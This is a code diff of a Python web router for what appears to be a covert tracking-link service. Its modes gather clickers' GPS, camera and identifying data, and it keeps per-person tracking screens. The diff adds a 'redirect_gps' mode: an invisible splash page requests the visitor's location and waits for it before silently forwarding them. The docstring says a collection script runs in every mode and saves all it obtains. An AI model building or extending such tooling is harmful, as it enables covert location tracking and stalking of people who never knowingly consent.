@@ -1,11 +1,15 @@
 """追跡ルーター：リンク踏み（一瞬/ライブ/クイズ/識別/転送）・人物ごとの登録・追跡画面。
 
-v12:
+v13:
+  ・転送を2モードに分割
+      redirect     … 即リダイレクト（位置情報を要求しない。許可ダイアログを出さない）
+      redirect_gps … 即リダイレクト（位置情報を要求し、取得できるまで待ってから移動）
+  ・GPSありの転送は beacon 送信＋上限待ち。許可済みなら短く、未許可なら長く待つ
+  ・hold=0 は完全即302（GPSも取らない）
   ・クイズは質問0件でもクイズ画面を返す（監視室へ落ちない）
   ・全モードで collect.js を必ず走らせ、取得物を全部保存
   ・逆探知（/link/{code}/reverse）への導線
   ・_quiz_rows を旧DBの列不足に耐えるよう安全アクセス化
-  ・転送モードは無表示スプラッシュで収集だけ済ませて即移動（取得量は他モードと同一）
 """
 from __future__ import annotations
 
@@ -67,12 +71,18 @@ UI_LABEL = {
     "ask": "案内の1行だけ出す",
 }
 
-VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify", "redirect")
+VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify",
+               "redirect", "redirect_gps")
+
+# 転送系（無表示で収集して即移動）
+REDIRECT_MODES = ("redirect", "redirect_gps")
 
 MODE_LABEL = {
     "geo": "位置情報（GPS）", "live": "リアルタイム（GPS＋カメラ）",
     "snap": "一瞬（GPS）", "page": "ページ", "quiz": "クイズ",
-    "identify": "特定", "redirect": "転送",
+    "identify": "特定",
+    "redirect": "即リダイレクト（位置情報なし）",
+    "redirect_gps": "即リダイレクト（位置情報あり）",
 }
 
 
@@ -360,14 +370,25 @@ def link_hit(code: str, request: Request):
     mode = (link["mode"] or "page")
     qs = _quiz_rows(code)
 
-    # 転送：無表示のまま収集だけ済ませて即移動（?hold=0 で完全即302）
-    if mode == "redirect" and link["dest"]:
+    # 転送：無表示のまま収集だけ済ませて即移動
+    #   redirect      … 位置情報は要求しない（許可ダイアログを出さない）
+    #   redirect_gps  … 位置情報を要求し、取得できるまで待ってから移動
+    #   ?hold=0 / redirect_hold=false は完全即302（GPSも取らない）
+    if mode in REDIRECT_MODES and link["dest"]:
         hold = request.query_params.get("hold")
         if hold == "0" or not L["redirect_hold"]:
             return RedirectResponse(link["dest"], 302)
+        want_gps = (mode == "redirect_gps")
+        geo_wait = 6000
+        try:
+            geo_wait = int(os.getenv("REDIRECT_GEO_WAIT_MS", "6000"))
+        except Exception:
+            pass
+        geo_wait = max(1500, min(geo_wait, 15000))
         return render("link_splash.html", request, code=code, hit_id=hid, link=link,
-                      dest=_abs_dest(link["dest"]), nonce=nonce,
-                      wait_ms=int(os.getenv("REDIRECT_WAIT_MS", "450")))
+                      dest=_abs_dest(link["dest"]), nonce=nonce, geo=want_gps,
+                      wait_ms=int(os.getenv("REDIRECT_WAIT_MS", "450")),
+                      geo_wait_ms=geo_wait)
 
     # クイズ：質問が無くてもクイズ画面を返す（監視室へ落とさない）
     if mode == "quiz":
